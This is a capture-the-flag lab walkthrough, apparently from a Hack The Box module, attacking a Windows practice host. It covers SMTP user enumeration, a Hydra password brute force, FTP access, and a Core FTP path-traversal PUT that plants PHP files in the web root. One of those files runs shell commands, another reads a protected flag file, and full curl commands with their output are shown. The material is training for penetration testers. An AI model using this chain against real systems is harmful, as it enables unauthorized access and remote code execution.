# Attacking Common Services - Easy

---

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

- `HTB{...}`

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

![[Pasted image 20260815182345.png]]

Steps for getting the flag

Step1. First we will namp the ports and also know the services running.
```bash
┌──(root㉿kali)-[~]
└─# nmap -v -sV -sC -O -T4 -A -oA /home/arjun/"Nmap Output"/easy 10.129.203.7  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-15 18:31 +0530
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating Ping Scan at 18:31
Scanning 10.129.203.7 [4 ports]
Completed Ping Scan at 18:31, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:31
Completed Parallel DNS resolution of 1 host. at 18:31, 0.50s elapsed
Initiating SYN Stealth Scan at 18:31
Scanning 10.129.203.7 [1000 ports]
Discovered open port 587/tcp on 10.129.203.7
Discovered open port 21/tcp on 10.129.203.7
Discovered open port 3389/tcp on 10.129.203.7
Discovered open port 443/tcp on 10.129.203.7
Discovered open port 25/tcp on 10.129.203.7
Discovered open port 3306/tcp on 10.129.203.7
Discovered open port 80/tcp on 10.129.203.7
Completed SYN Stealth Scan at 18:31, 19.13s elapsed (1000 total ports)
Initiating Service scan at 18:31
Scanning 7 services on 10.129.203.7
Completed Service scan at 18:31, 23.83s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against 10.129.203.7
Retrying OS detection (try #2) against 10.129.203.7
Initiating Traceroute at 18:31
Completed Traceroute at 18:31, 0.45s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:31
Completed Parallel DNS resolution of 2 hosts. at 18:31, 1.50s elapsed
NSE: Script scanning 10.129.203.7.
Initiating NSE at 18:31
Completed NSE at 18:32, 49.99s elapsed
Initiating NSE at 18:32
Completed NSE at 18:33, 23.51s elapsed
Initiating NSE at 18:33
Completed NSE at 18:33, 0.00s elapsed
Nmap scan report for 10.129.203.7
Host is up (0.41s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shaWithRSAEncryption
| Not valid before: 2022-04-21T19:27:17
| Not valid after:  2032-04-18T19:27:17
| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL, SMBProgNeg: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|   SSLSessionReq: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|_    Command unknown, not supported or not allowed...
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
443/tcp  open  ssl/https     Core FTP HTTPS Server
|_ssl-date: 2026-08-15T13:02:49+00:00; -1s from scanner time.
|_http-server-header: Core FTP HTTPS Server
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: shaWithRSAEncryption
| Not valid before: 2022-04-21T19:27:17
| Not valid after:  2032-04-18T19:27:17
| MD5:     27ed 2da8 8b25 57e3 d2fc c0c8 9f0b 55b0
| SHA-1:   5018 d8d5 ba6b 5a1c 8df6 5969 45d7 fe06 3d32 7fad
|_SHA-256: 9412 24b0 f661 ef53 da56 d22c bc3a 15d7 7477 5121 53aa 4360 8390 1f4c a663 e23e
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date:Sat, 15 Jul 2026 13:01:37 GMT
|     Server: Core FTP HTTPS Server
|     Connection: close
|     WWW-Authenticate: Basic realm="Restricted Area"
|     Content-Type: text/html
|     Content-length: 61
|     <BODY>
|     <HTML>
|     HTTP/1.1 401 Unauthorized
|     </BODY>
|_    </HTML>
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MariaDB 5.5.5-10.4.24
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, LongColumnFlag, SupportsCompression, FoundRows, ODBCClient, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: *"hk^sL^uRv!<I=4-#eV
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-15T13:02:49+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WIN-EASY
| Issuer: commonName=WIN-EASY
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-14T12:55:19
| Not valid after:  2027-02-13T12:55:19
| MD5:     afeb b17d fc76 5259 a13e bf09 39de 26d7
| SHA-1:   5b4f ffdc 32b1 5e2f 874d e6c5 f9e2 b0fe 78a8 9a83
|_SHA-256: dbd5 6e3d c319 e665 abe5 e8f9 a5be f13f 18a6 2251 595f 2707 ea17 00b4 9c69 cc45
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-15T13:02:03+00:00
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.99%I=7%D=8/15%Time=6A806328%P=x86_64-pc-linux-gnu%r(NULL
SF:,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x20725,\
SF:x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FTP\x
SF:20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered
SF:\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allo
SF:wed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20no
SF:t\x20allowed\.\.\.\r\n")%r(SSLSessionReq,77,"220\x20Core\x20FTP\x20Serv
SF:er\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n50
SF:2\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20allowed\.\
SF:.\.\r\n")%r(SMBProgNeg,41,"220\x20Core\x20FTP\x20Server\x20Version\x202
SF:\.0,\x20build\x20725,\x2064-bit\x20Unregistered\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port443-TCP:V=7.99%T=SSL%I=7%D=8/15%Time=6A806332%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,110,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:Sat,\x2015\
SF:x20Jul\x202026\x2013:01:37\x20GMT\r\nServer:\x20Core\x20FTP\x20HTTPS\x2
SF:0Server\r\nConnection:\x20close\r\nWWW-Authenticate:\x20Basic\x20realm=
SF:\"Restricted\x20Area\"\r\nContent-Type:\x20text/html\r\nContent-length:
SF:\x2061\r\n\r\n<BODY>\r\n<HTML>\r\nHTTP/1\.1\x20401\x20Unauthorized\r\n<
SF:/BODY>\r\n</HTML>\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (91%), Microsoft Windows 10 1903 - 22H2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Randomized
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   448.39 ms 10.10.16.1
2   448.42 ms 10.129.203.7

NSE: Script Post-scanning.
Initiating NSE at 18:33
Completed NSE at 18:33, 0.00s elapsed
Initiating NSE at 18:33
Completed NSE at 18:33, 0.00s elapsed
Initiating NSE at 18:33
Completed NSE at 18:33, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.95 seconds
           Raw packets sent: 2092 (95.732KB) | Rcvd: 50 (2.826KB)

```

Step2. We will start attacking with smtp and we will have to find users first so we will enumerate user by smtp_enum and user and pass list was already provided by the htb so i downloaded it and used.
```bash
┌──(root㉿kali)-[~]
└─# smtp-user-enum -M RCPT \
-U /home/arjun/Downloads/cyber/users.list \                         
-t 10.129.203.7 \
-D inlanefreight.htb
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... /home/arjun/Downloads/cyber/users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sat Aug 15 20:36:39 2026 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Sat Aug 15 20:37:26 2026 #########
1 results.

79 queries in 47 seconds (1.7 queries / sec)

```

Step3. We will now need password as well we will enumerate it by using hydra and we will get our password by bruteforcing. we have founded our password.
```bash
┌──(root㉿kali)-[~]
└─# hydra -l fiona \                                      
-P /usr/share/wordlists/rockyou.txt \
-t 1 \
-v \
10.129.111.81 ftp
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-15 23:15:37
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking ftp://10.129.111.81:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 26.00 tries/min, 26 tries in 00:01h, 14344373 to do in 9195:07h, 1 active
[STATUS] 25.00 tries/min, 75 tries in 00:03h, 14344324 to do in 9562:53h, 1 active
[21][ftp] host: 10.129.111.81   login: fiona   password: 987654321
[STATUS] attack finished for 10.129.111.81 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-15 23:19:05

```

Step4. We will now use ftp for getting some juicy info and login via founded credentials above, while searching we found 2 txt files which contains web info and some confidential docs as well.
```bash
┌──(root㉿kali)-[~]
└─# ftp 10.129.111.81
Connected to 10.129.111.81.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.111.81:arjun): fiona
331 password required for fiona
Password: 
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40685|)
ftp: Can't connect to `10.129.111.81:40685': Connection timed out
200 PORT command successful
150 Opening ASCII mode data connection
-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
226 Transfer Complete
ftp> get docs.txt
local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
    55        0.16 KiB/s 
226 Transfer Complete
55 bytes received in 00:00 (0.16 KiB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
   255        0.94 KiB/s 
226 Transfer Complete
255 bytes received in 00:00 (0.94 KiB/s)
ftp> exit
221-
221 Goodbye
```

Step5. We will open the file to read content as below
```bash
┌──(root㉿kali)-[~]
└─# cat docs.txt         
I'm testing the FTP using HTTPS, everything looks good.                                                                                                                                                                                                                                             
┌──(root㉿kali)-[~]
└─# cat WebServersInfo.txt
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php  
```

Step6. Now we will use core ftp http server to attack and the version is vulnerable to directory path transversal due to the built version is old. We will now check tls version 1.2 explicitly and it is working
```bash
┌──(root㉿kali)-[~]
└─# curl -vk --tlsv1.2 --tls-max 1.2 \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
https://10.129.111.81/docs.txt
*   Trying 10.129.111.81:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.2 (OUT), TLS handshake, Client hello (1):
* SSL Trust: peer verification disabled
* TLSv1.2 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp384r1 / rsaEncryption
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*   subject: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
*   start date: Apr 21 19:27:17 2022 GMT
*   expire date: Apr 18 19:27:17 2032 GMT
*   issuer: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using shaWithRSAEncryption
* OpenSSL verify result: 12
*  SSL certificate verification failed, continuing anyway!
* Established connection to 10.129.111.81 (10.129.111.81 port 443) from 10.10.17.239 port 39752 
* using HTTP/1.x
* Server auth using Basic with user 'fiona'
> GET /docs.txt HTTP/1.1
> Host: localhost
> Authorization: Basic ZmlvbmE6OTg3NjU0MzIx
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date:Sat, 15 Jul 2026 18:56:06 GMT
< Server: Core FTP HTTP Server
< Accept-Ranges: bytes
< Connection: close
< Last-modified: Thr, 21 Apr 2022 19:23:25 GMT
< Content-type: text/text
< Content-length: 55
< 
* shutting down connection #0
I'm testing the FTP using HTTPS, everything looks good.
```

Step7. We will now create a dummy file (payload) and then upload it to check the file working or not and it worked.
```bash
┌──(root㉿kali)-[~]
└─# echo 'HTB-PUT-TEST' > /tmp/test.txt

┌──(root㉿kali)-[~]
└─# curl -vk --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.txt \
--path-as-is \
https://10.129.111.81/docs.txt
*   Trying 10.129.111.81:443...
* ALPN: curl offers h2,http/1.1
* TLSv1.2 (OUT), TLS handshake, Client hello (1):
* SSL Trust: peer verification disabled
* TLSv1.2 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp384r1 / rsaEncryption
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*   subject: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
*   start date: Apr 21 19:27:17 2022 GMT
*   expire date: Apr 18 19:27:17 2032 GMT
*   issuer: C=US; ST=FL; L=test; OU=Test; O=Testing; emailAddress=fiona@inlanefreight.htb; CN=Test
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using shaWithRSAEncryption
* OpenSSL verify result: 12
*  SSL certificate verification failed, continuing anyway!
* Established connection to 10.129.111.81 (10.129.111.81 port 443) from 10.10.17.239 port 52486 
* using HTTP/1.x
* Server auth using Basic with user 'fiona'
> PUT /docs.txt HTTP/1.1
> Host: localhost
> Authorization: Basic ZmlvbmE6OTg3NjU0MzIx
> User-Agent: curl/8.20.0
> Accept: */*
> Content-Length: 13
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 13 bytes
< HTTP/1.1 200 Ok
< Date:Sat, 15 Jul 2026 18:56:33 GMT
< Server: Core FTP HTTP Server
< Accept-Ranges: bytes
< Connection: Keep-Alive
< Content-type: text/text
* no chunk, no close, no size. Assume close to signal end
< 
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 18:56:33 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: text/text
Content-length: 13

* TLSv1.2 (IN), TLS alert, close notify (256):
* shutting down connection #0

```

Step8. the process is repeated till to find the path of the flag.
```bash
┌──(root㉿kali)-[~]
└─# cat > /tmp/test.php <<'EOF'
<?php
echo "HTB-PHP-WORKS";
?>
EOF

┌──(root㉿kali)-[~]
└─# curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/test.php'
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 18:57:14 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 31
  
┌──(root㉿kali)-[~]
└─# curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/test.php'
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 18:57:23 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 31

┌──(root㉿kali)-[~]
└─# curl http://10.129.111.81/test.php
HTB-PHP-WORKS                                                                                                                                                                                                                                             
┌──(root㉿kali)-[~]
└─# cat > /tmp/flag.php <<'EOF'
<?php
echo file_get_contents('C:\\flag.txt');
?>
EOF

┌──(root㉿kali)-[~]
└─# curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/flag.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/flag.php'
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 18:57:55 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 49

┌──(root㉿kali)-[~]
└─# curl http://10.129.111.81/flag.php
<br />
<b>Warning</b>:  file_get_contents(C:\flag.txt): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\flag.php</b> on line <b>2</b><br />

┌──(root㉿kali)-[~]
└─# cat > /tmp/flag.php <<'EOF'
<?php
echo shell_exec('where /r C:\\ flag.txt 2>&1');
?>
EOF

┌──(root㉿kali)-[~]
└─# curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/flag.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/flag.php'
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 18:58:44 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 57

┌──(root㉿kali)-[~]
└─# curl http://10.129.111.81/flag.php

<br />
<b>Fatal error</b>:  Maximum execution time of 120 seconds exceeded in <b>C:\xampp\htdocs\flag.php</b> on line <b>2</b><br />

```

Step9. As soon as we found the path we get the flag as well.
```bash
┌──(root㉿kali)-[~]
└─# curl http://10.129.111.81/flag.php
C:\Users\Administrator\Desktop\flag.txt

┌──(root㉿kali)-[~]
└─# cat > /tmp/flag.php <<'EOF'
<?php
echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
?>
EOF

┌──(root㉿kali)-[~]
└─# cat > /tmp/flag.php <<'EOF'
<?php
echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
?>
EOF

┌──(root㉿kali)-[~]
└─# curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/flag.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/flag.php'
HTTP/1.1 200 Ok
Date:Sat, 15 Jul 2026 19:15:51 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 80

┌──(root㉿kali)-[~]
└─# curl http://10.129.111.81/flag.php
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}             
```

